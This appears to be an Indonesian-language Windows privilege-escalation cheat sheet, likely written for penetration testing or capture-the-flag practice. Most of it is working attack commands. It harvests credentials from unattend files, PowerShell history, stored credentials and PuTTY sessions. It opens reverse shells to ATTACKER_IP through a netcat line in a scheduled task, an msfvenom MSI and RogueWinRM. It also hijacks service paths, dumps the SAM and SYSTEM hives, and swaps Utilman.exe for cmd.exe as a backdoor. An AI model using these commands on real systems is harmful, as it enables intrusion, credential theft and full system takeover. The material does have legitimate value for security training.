
# 🛠️ Windows Privilege Escalation (Cheatsheet)

## 1. 🧭 ENUMERASI DASAR (t0 – t3)

Langkah awal: kenali sistem, user, network, dan servis.

```cmd
systeminfo
hostname
echo %username%
net users
net user %username%
ipconfig /all
route print
arp -a
netstat -ano
net view
net share
net localgroup
net localgroup administrators
net accounts
```

---

## 2. 🔑 PENGAMBILAN KREDENSIAL

### Unattended Installation Files

Cek lokasi berikut:

```cmd
dir C:\ /s /b | findstr /i unattend
```

Contoh file:

```
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\System32\sysprep.inf
```

### PowerShell History

```cmd
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

### Stored Credentials

```cmd
cmdkey /list
runas /savecred /user:Administrator cmd.exe
```

### IIS Web.config

```cmd
findstr /si "password" C:\inetpub\wwwroot\web.config
```

### PuTTY Saved Sessions

```cmd
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

---

## 3. ⚙️ QUICK WINS & MISCONFIGURATIONS

### Scheduled Tasks

```cmd
schtasks /query /fo LIST /v
icacls C:\tasks\schtask.bat
```

Jika memiliki hak tulis:

```cmd
echo C:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
schtasks /run /tn vulntask
```

### AlwaysInstallElevated

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

Jika keduanya bernilai `1`, buat file `.msi`:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f msi -o shell.msi
msiexec /quiet /qn /i C:\path\to\shell.msi
```

---

## 4. 🛡️ SERVICE MISCONFIGURATION

### Executable Bisa Ditimpa

```cmd
sc qc <service_name>
icacls "C:\Program Files\ServiceFolder\service.exe"
```

### Unquoted Service Path

```cmd
sc qc "vulnservice"
```

Jika path seperti:

```
C:\Program Files\Unquoted Path\app.exe
```

Letakkan payload di:

```
C:\Program.exe
```

### Insecure Service Permissions (DACL)

```cmd
accesschk64.exe -qlc <service_name>
```

Jika Users punya `SERVICE_ALL_ACCESS`:

```cmd
sc config <service_name> binPath= "C:\Users\Public\rev.exe" obj= LocalSystem
sc stop <service_name>
sc start <service_name>
```

---

## 5. 🔐 WINDOWS PRIVILEGES

### SeBackup / SeRestore

```cmd
reg save HKLM\SAM C:\Users\Public\sam.hive
reg save HKLM\SYSTEM C:\Users\Public\system.hive
```

Copy ke attacker dan dump:

```bash
python3 secretsdump.py -sam sam.hive -system system.hive LOCAL
```

### SeTakeOwnership

```cmd
takeown /f C:\Windows\System32\Utilman.exe
icacls C:\Windows\System32\Utilman.exe /grant <username>:F
copy C:\Windows\System32\cmd.exe C:\Windows\System32\Utilman.exe
```

Trigger:

* Lock screen
* Klik “Ease of Access”

### SeImpersonate / SeAssignPrimaryToken (RogueWinRM)

```cmd
C:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe <ATTACKER_IP> 4442"
```

---

## 6. 🧸 UNPATCHED SOFTWARE

### Cari software dan versinya

```cmd
wmic product get name,version
```

---

## 7. 📀 CONTOH KERNEL EXPLOIT (FuzzySecurity)

### Buffer Overflow di Driver (HackSysExtremeVulnerableDriver)

Langkah:

* Load driver
* Kirim buffer dengan IOCTL panjang
* Overwrite token SYSTEM

---

## ✅ Tips

* Selalu gunakan `icacls` dan `accesschk` untuk validasi akses.
* Periksa apakah service berjalan sebagai SYSTEM dan apakah executable bisa ditulis.
* Jika hak istimewa dimiliki (SeTakeOwnership, SeBackup), langsung cari peluang.
* Gunakan tools enum untuk percepat deteksi vektor eskalasi.
